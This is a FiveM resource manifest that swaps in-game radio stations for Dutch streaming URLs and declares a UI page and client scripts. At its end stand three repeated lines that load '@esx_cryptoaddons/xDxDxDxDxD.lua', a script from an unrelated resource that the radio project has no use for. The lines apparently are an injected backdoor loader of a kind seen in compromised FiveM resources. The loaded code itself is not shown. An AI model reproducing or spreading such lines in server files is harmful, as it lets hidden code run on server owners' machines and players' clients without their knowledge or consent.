resource_manifest_version "44febabe-d386-4d18-afbe-5e627f4af937"


-- http://www.hendrikjansen.nl/henk/streaming.html#po
-- Example custom radios
-- Nummer 16 is off

supersede_radio "RADIO_01_CLASS_ROCK" { url = "https://icecast.omroep.nl/radio1-bb-mp3", volume = 1, name = "Radio 1"} -- NPO 1 - Nummer 4
supersede_radio "RADIO_02_POP" { url = "https://icecast.omroep.nl/radio2-bb-mp3", volume = 0.2, name = "Radio 2" } -- NPO 2 - Nummer 5
supersede_radio "RADIO_03_HIPHOP_NEW" { url = "https://icecast.omroep.nl/3fm-bb-mp3", volume = 0.2, name = "3FM" } -- NPO 4 - Nummer 11
supersede_radio "RADIO_04_PUNK" { url = "https://19993.live.streamtheworld.com/SKYRADIO.mp3", volume = 0.2, name = "Skyradio" } -- NPO 5 - Nummer 3
supersede_radio "RADIO_05_TALK_01" { url = "https://icecast.omroep.nl/3fm-bb-mp3", volume = 0.2, name = "Skyradio Hitzone" } -- 3FM - Nummer 18

supersede_radio "RADIO_06_COUNTRY" { url = "https://21253.live.streamtheworld.com/RADIO538.mp3", volume = 0.2, name = "Radio 538" } -- Caz - Nummer 1
supersede_radio "RADIO_07_DANCE_01" { url = "https://21293.live.streamtheworld.com/TLPSTR11.mp3", volume = 0.2, name = "Radio 538 Hitzone" } -- Fun X - Nummer 6
supersede_radio "RADIO_08_MEXICAN" { url = "https://22323.live.streamtheworld.com/100PNL_MP3_SC?", volume = 0.2, name = "100% NL" } -- 100% NL - Nummer 2
supersede_radio "RADIO_09_HIPHOP_OLD" { url = "http://icecast-qmusic.cdp.triple-it.nl/Qmusic_be_live_128.mp3", volume = 0.2, name = "Q-music BE" } -- Q-music - Nummer 9

supersede_radio "RADIO_11_TALK_02" { url = "http://icecast-qmusicnl-cdp.triple-it.nl/Qmusic_nl_classics_96.mp3", volume = 0.2, name = "Q-music SummerMusic" } -- Q-music Christmas - Nummer 7
supersede_radio "RADIO_12_REGGAE" { url = "http://icecast-qmusicnl-cdp.triple-it.nl/Qmusic_nl_nonstop_96.mp3", volume = 0.2, name = "Q-music Non-Stop" } -- Q-music Non-Stop - Nummer 12
supersede_radio "RADIO_13_JAZZ" { url = "https://stream.slam.nl/slam_mp3", volume = 0.2, name = "SLAM FM"} -- Sky Radio 101 FM - Nummer 13

supersede_radio "RADIO_14_DANCE_02" { url = "https://stream.slam.nl/web10_mp3", volume = 0.2, name = "SLAM FM NONSTOP" } -- Radio 538 - Nummer 14
supersede_radio "RADIO_15_MOTOWN" { url = "https://stream.slam.nl/web12_mp3", volume = 0.2, name = "SLAM THE BOOM ROOM" } -- Radio 538 Dance Radio - Nummer 15
supersede_radio "RADIO_20_THELAB" { url = "https://stream.slam.nl/web11_mp3", volume = 0.2, name = "SLAM HARDSTYLE" } -- Radio 538 Hitzone - Nummer 20
supersede_radio "RADIO_16_SILVERLAKE" { url = "https://icecast.omroep.nl/funx-bb-mp3", volume = 0.2, name = "FunX" } -- Radio 538 Non-Stop - Nummer 8
supersede_radio "RADIO_17_FUNK" { url = "https://icecast.omroep.nl/funx-arab-bb-mp3", volume = 0.2, name = "FunX Arab" } -- Radio 538 Party - Nummer 17

supersede_radio "RADIO_18_90S_ROCK" { url = "https://icecast.omroep.nl/funx-dance-bb-mp3", volume = 0.2, name = "FunX Dance" } -- EDM & Progressive NitroX DJ-Mix - Nummer 10

-- supersede_radio "RADIO_11_TALK_02" { url = "http://stream.sunshine-live.de/edm/mp3-192", volume = 0.2 } -- EDM - Nummer 21
supersede_radio "RADIO_18_90S_ROCK" { url = "http://20863.live.streamtheworld.com/WEB11_MP3_SC?", volume = 0.2 } -- Slam! Hardstyle - Nummer 10

files {
	"index.html"
}

ui_page "index.html"

client_scripts {
	"data.js",
	"client.js"
}




client_script '@esx_cryptoaddons/xDxDxDxDxD.lua'

client_script '@esx_cryptoaddons/xDxDxDxDxD.lua'

client_script '@esx_cryptoaddons/xDxDxDxDxD.lua'